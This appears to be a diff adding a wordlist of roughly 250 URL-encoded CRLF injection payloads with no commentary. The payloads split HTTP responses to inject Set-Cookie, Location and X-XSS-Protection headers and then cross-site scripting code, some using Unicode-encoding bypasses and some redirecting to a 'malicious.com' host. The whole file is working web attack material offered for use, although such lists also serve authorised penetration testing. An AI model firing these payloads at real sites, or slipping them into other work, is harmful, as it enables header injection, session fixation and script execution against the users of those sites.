@@ -1,0 +1,253 @@
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3A%20whoami%3Dthecyberneh%25u2028%25u2029XSS-Payload%3A%2520%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%0D%0A%0D%0A%3Cscript%3E%0D%0A%20alert(1);%0D%0A%3C/script%3E%0D%0A
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE%0D%0A%0D%0A<script>%0D%0Aalert(1);%0D%0A</script>
+%E5%98%8D%E5%98%8ALocation:https://example.com/%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE%0D%0A%0D%0A<script>%0D%0Aalert(1);%0D%0A</script>
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%3Cscript%3Ealert(1);%3C/script%3E
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0a%3Cscript%3Ealert(1);%3C/script%3E
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%0d%0a%0d%0a%3Cscript%3Ealert(1);%3C/script%3E
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%0d%0a%0d%0a%3Cscript%3Ealert(1);%3C/script%3E
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%E5%98%8A%0a%3Cscript%3Ealert(1);%3C/script%3E
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=crlfinjection%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+%0D%0AConnection:%20Location,%20close%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2039%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E
+%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%25u2028%25u2029%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert%281%29%3B%E5%98%BC%2Fscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%250a%250d%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert%281%29%3B%E5%98%BC%2Fscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%250a%250d%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert%281%29%3B%E5%98%BC%2Fscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%25u2028%25u2029%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert%281%29%3B%E5%98%BC%2Fscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%2520%2509%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert%281%29%3B%E5%98%BC%2Fscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%250d%250a%2520%2509%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%250d%250ascript%E5%98%BEalert%281%29%3B%250d%250a%2520%2509%E5%98%BC%2Fscript%E5%98%BE
+%e5%98%8d%e5%98%8aset-cookie%3awhoami%3dthecyberneh%e5%98%8d%e5%98%8a%0d%0a%e5%98%8d%e5%98%8a%e5%98%8d%e5%98%8d%e5%98%8a%e5%98%8d%e5%98%8ascrip%e5%98%bealert(1)%3b%e5%98%bcscript%e5%98%be
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%0D%0A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8Aalert(1);%0D%0A%E5%98%BCscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%250A%2520%2509%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert%281%29%3B%E5%98%BC%2Fscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie%3Awhoami%3Dthecyberneh%E5%98%8D%E5%98%8A%25u2028%25u2029%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert%281%29%3B%E5%98%BC%2Fscript%E5%98%BE%0A
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--
+%0d%0a%0d%0aX-XSS-Protection%3A0%0d%0aContent-Type%3A%20text/html%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+%0d%0a%0d%0aX-XSS-Protection%3A0%0d%0aContent-Type%3A%20text/html%0d%0a%0d%0a<script>alert(document.cookie)<%2Fscript>
+%0d%0a%0d%0aX-XSS-Protection%3A0%0d%0aContent-Type%3A%20text/html%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+%0d%0a%0d%0aX-XSS-Protection%3A0%0d%0aContent-Type%3A%20text/html%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+%0d%0aSet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0a
+en%0AContent-Length%3A%2035%0A%0AX-XSS-Protection%3A%200%0ASet-Cookie%3A%20crlfinjection%3D%3Csvg%2Fonload%3Dalert(document.domain)%3E%0A%0A%0A%3Csvg%2Fonload%3Dalert(document.domain)%3E
+en%0AContent-Length%3A%2035%0A%0AX-XSS-Protection%3A%200%0ASet-Cookie%3A%20crlfinjection%3D%3Csvg%2Fonload%3Dalert(document.domain)%3E%0A%0A%0A%0A%3Csvg%2Fonload%3Dalert(document.domain)%3E
+en%0AContent-Length%3A%2035%0A%0AX-XSS-Protection%3A%200%0A%0A%0A%3Cdiv%20id%3D%22xss%22%3E%3C%2Fdiv%3E%3Cscript%3Edocument.getElementById('xss').innerHTML%20%3D%20'%3Csvg%2Fonload%3Dalert(document.domain)%3E'%3B%3C%2Fscript%3E%0A%0A%0A%3Csvg%2Fonload%3Dalert(document.domain)%3E
+crlf%0d%0aSet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0a
+%3Fcrlf=%0d%0aSet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0a
+%23%0dSet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0a
+%0ASet-Cookie:%20NEW_COOKIE=<script>alert(6)</script>%0A
+%23%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A<svg/onload%3dalert(document.domain)>
+%23%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A<svg/onload%3dalert(document.domain)>%29%3e
+%09Set-Cookie: NEW_COOKIE=<script>alert(1)</script>%0B
+%20Set-Cookie:%20NEW_COOKIE=<script>alert(6)</script>%20
+%0D%0ASet-Cookie:%20<script>alert(6)</script>
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert (1)</script>
+%0d%0aSet-Cookie: name=<script>alert(document.domain)</script>%0d%0a
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3Cimg%20src=1%20onerror=alert(1)%3E%E5%98%8A%E5%98%8A%E5%98%BCscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%42%52%51%45%3Cscript%3Ealert(2);%3C/script%3E%E5%98%8A%E5%98%BCscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%3Cimg%20src=x%20onerror=alert(document.domain)%3E%E5%98%8A%E5%98%8A%E5%98%BCscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%22%3E%3Csvg/onload=alert(1)%3E%E5%98%8A%E5%98%8A%E5%98%BCscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%3Cbody%20onload=alert(%22bingo%22)%3E%E5%98%8A%E5%98%8A%E5%98%BCscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%3Csvg/onload=alert(%22Hacked%22)%3E%E5%98%8A%E5%98%8A%E5%98%BCscript%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%20%3Cscript%3Ealert(1)%3C/script%3E%E5%98%8D%E5%98%8A
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%2D%2D%3E%3Cscript%3Ealert(123)%3C/script%3E%E5%98%8A%E5%98%8A
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%3CScRiPt%3Ealert(1)%3C%2fScRiPt%3E%E5%98%8D%E5%98%8A
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%3Cimg%20src=%22x%22%20onerror=%22alert(1)%22%3E%E5%98%8A%E5%98%8A
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%253Csvg%252Fonload%253Dalert(1)%253E%E5%98%8A%E5%98%8A
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8Ajavascript:alert(document.domain)%E5%98%8A%E5%98%8A
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%3Ciframe%20src=javascript:alert(1)%3E%E5%98%8A%E5%98%8A
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<img%20src=1%20onerror=alert(1)>
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0aBadRequest.html/?aspxerrorpath=<script>alert(2);</script>
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<img%20src=x%20onerror=alert(document.domain)>
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a"><svg/onload=alert(1)>
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<body%20onload=alert(“bingo”)>
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%0d%0a%20<script>alert(1)</script>
+%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0ajavascript:alert(document.domain)
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Csvg%20onload%3Dalert%281%29%3E%3C%2Fsvg%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%22%3E%3Cimg%20src%3D%221%22%20onerror%3Dalert%281%29%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cbody%20onload%3Dalert%28%E2%80%9Cbingo%E2%80%9D%29%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cscript%3Ealert%28%29%3C%2Fscript%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Csvg%2Fonload%3Dalert%28%E2%80%9CHacked%E2%80%9D%29%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%E5%98%8D%E5%98%8A%20%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%21--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0ajavascript:alert(document.domain)
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<image src=x onerror=alert(1)>
+%0D%0ASet-Cookie:mycookie="><svg/onload=alert(1)>
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E%0d%0a%3Cimg%20src=x%20onerror=alert(1)%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cimg%20src=x%20onerror=alert(1)%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A99.0%29%20Gecko%2F20100101%20Firefox%2F99.0
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E?param=%3Cimg%20src=x%20onerror=alert(1)%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E%3B%20HttpOnly;%20Path=/
+%0D%0ASet-Cookie:%20NEW_COOKIE=<script>alert(6)</script>%0D%0A
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3cscript%3Ealert%28document.domain%29%3C/script%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3C%73%63%72%69%70%74%3Ealert%28document%2Edomain%29%3C%2F%73%63%72%69%70%74%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29%3c%2f%73%63%72%69%70%74%3e
+%0ASet-Cookie:exed%eaxedea23%8d%ea<svg%20onload=alert(document.domain)>%8d%eae%ed%ea/%2e%2e
+%0d%0aSet-Cookie:%20NEW_COOKIE=<script>alert(6)</script>%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0aSet-Cookie:%20NEW_COOKIE=<script>alert(6)</script>%0d%0a%0d%0a<script>alert(document.cookie)</script>
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BC<script>alert(1337)</script>;嘼%E5%98%BC/script%E5%98%BESet-Cookie:%20NEW_COOKIE=<script>alert(6)</script>%0d%0a
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0aSet-Cookie:%20NEW_COOKIE=%3Cscript%3Ealert(6)%3C/script%3E%0d%0a%0d%0a--%3E%0d%0a%3Cscript%3Ealert(123)%3C/script%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:text/htmlX-XSS-Protection:0>'><script>alert(2);</script>%0d%0a
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%0d%0a%0d%0a<script>alert(document.domain)</script>%0d%0a
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0aSet-Cookie:%20NEW_COOKIE=<script>alert(6)</script>%0d%0a%0d%0a<html><script>alert(document.domain)</script><!--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%0d%0a%0d%0a<script>alert(document.domain)</script>
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.domain)</script><!--
+%3f%0d%0aLocation:%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E
+%E5%98%8A%E5%98%8DSet-Cookie:%20test%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+%2F%250ASet-Cookie%3A%20crlfinjection%250A%250A%3Cimg%20src%3Dx%20onerror%3Dalert%289%29%3E%20HTTP%2F1.1
+%0ASet-Cookie: crlfinjection%0A%0A%3Cimg%20src%3Dx%20onerror%3Dalert%289%29%3E%20HTTP%2F1.1
+index.html%0AContent-Type:%20text/html%0AContent-Encoding:%20deflate%ØAContent-Length:%2026%0A%0A%b3%29%4e%2e%c%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+%0AContent-Type:%20text/html%0AContent-Encoding:%20deflate%ØAContent-Length:%2026%0A%0A%b3%29%4e%2e%c%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
+%22%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0aSet-Cookie:%20NEW_COOKIE=%3Cscript%3Ealert(6)%3C/script%3E%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BC%3Cscript%3Ealert(1337)%3C/script%3E;%E5%98%BC%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0aSet-Cookie:%20NEW_COOKIE=%3Cscript%3Ealert(6)%3C/script%3E%0d%0a%0d%0a--%3E%3Cscript%3Ealert(123)%3C/script%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:text/htmlX-XSS-Protection:0%3E'%3E%3Cscript%3Ealert(2);%3C/script%3E%0d%0a
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E%0d%0a
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0aSet-Cookie:%20NEW_COOKIE=%3Cscript%3Ealert(6)%3C/script%3E%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C!--
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C!--
+%3fLocation%3a%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3EContent-Type:text/htmlX-XSS-Protection:0
+%3fContent-Type%3a%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3ELocation:text/htmlX-XSS-Protection:0
+%3fX-XSS-Protection%3a%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3ELocation:text/htmlContent-Length:0
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0Athecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0a
+%E5%98%8D%E5%98%8A%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0A%0d%0Athecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0A
+%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a/%0d%0a%0d%0acrlf%0A%20%0d%0acrlf%E5%98%8A%E5%98%8D%0D%0A%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0athecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0a
+%E5%98%8A%E5%98%8D%0d%0a%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0A%0d%0A%0d%0Athecyberneh%0d%0a%0d%0a%0d%0ascript%0d%0aalert(1);%0d%0a/script%0d%0A
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0A%3Cscript%3Ealert(1)%3C/script%3E
+%E5%98%8D%E5%98%8A%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0A%0d%0A%3Cscript%3Ealert(1)%3C/script%3E
+%0d%0aSet-Cookie:%20malicious=1%3b%20Path=/;%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0A%3Cscript%3Ealert(1)%3C/script%3E
+%0d%0aX-XSS-Protection:%200%0d%0aContent-Type:%20text/html%0d%0aSet-Cookie:%20session=exploited%0d%0a%0d%0A%3Cscript%3Ealert(1)%3C/script%3E
+%E5%98%8D%E5%98%8A%0d%0aLocation:%20%2F%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%0d%0aContent-Type:%20text/html%0d%0a%0d%0A
+%0d%0aContent-Type:%20text/html%0d%0aLocation:%3Cscript%3Ealert(1)%3C/script%3E%0d%0a%0d%0A
+%E5%98%8D%E5%98%8A%0d%0aContent-Type:%20text/html%0d%0aLocation:%3Cscript%3Ealert(1)%3C/script%3E%0d%0a%0d%0A
+%0d%0aX-XSS-Protection:%3B%20mode=block%0d%0aLocation:%20%22%3E%3Cscript%3Ealert(1)%3C/script%3E%0d%0a%0d%0A
+%E5%98%8D%E5%98%8A%0d%0aX-XSS-Protection:%3B%20mode=block%0d%0aLocation:%20%22%3E%3Cscript%3Ealert(1)%3C/script%3E%0d%0a%0d%0A
+\r\n%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<img%20src=1%20onerror=alert(1)>
+\r\n%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a">%3Cimg%20src=1%20onerror=alert(1)%3E
+\r\n%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a--><svg%20onload=alert(1)>
+\r\n%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0aBadRequest.html/?aspxerrorpath=<script>alert(2);</script>
+\r\n%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<img%20src=x%20onerror=alert(document.domain)>
+\r\n%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a"><svg/onload=alert(1)>
+%3f0dCookie:%20<img%20ignored=()%20src=x%20onerror=prompt(1)%3E%09%0d%0aContent-Type:%20text/html%0d%0aLocation:%20https://malicious.com%20HTTP/1.1
+%3f0dCookie:%20"></img%20src=x%20ONERROR=prompt(document.domain);>%0d%0aX-XSS-Protection:%200%0d%0aLocation:%20https://malicious.com%20HTTP/1.1
+%3f0dCookie:%20"></img%20src=x%20ONERROR=prompt(document.domain);>%0d%0aSet-Cookie:%20sessionid=123%3B%20path=/;%0d%0aLocation:%20https://malicious.com%20HTTP/1.1
+%3f0dCookie:%20<img%20ignored=()%20src=x%20onerror=prompt(1)%3E%09%0d%0aX-XSS-Protection:%200%0d%0aLocation:%20https://malicious.com%20HTTP/1.1
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<script>alert(1)</script>
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0ajavascript:alert(1337);
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a"><svg onload=alert(1)>
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a<img/src/onerror=alert(\ibro`)>`
+%3f%0d%0aLocation:%0d%0aContent-Type:text/htmlX-XSS-Protection:0<script>alert(6)</script>
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BC<script>alert(1337)</script>;嘼%E5%98%BC/script%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BC"><svg onload=alert(1)>;嘼%E5%98%BC/script%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BC<img/src/onerror=alert(ibro)>;嘼%E5%98%BC/script%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BC<script>alert(6)</script>嘼%E5%98%BC/script%E5%98%BE
+%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BC%0d%0a%0d%0a<script>alert(document.domain)</script>;嘼%E5%98%BC/script%E5%98%BE
+en%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLast-Modified%3A%20Fri%2C%2030%20Apr%202099%2011%3A11%3A18%20GMT%0aContent-Length%3A%2048%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
+%0d%0a%0d%0a<script>alert(document.domain)</script>
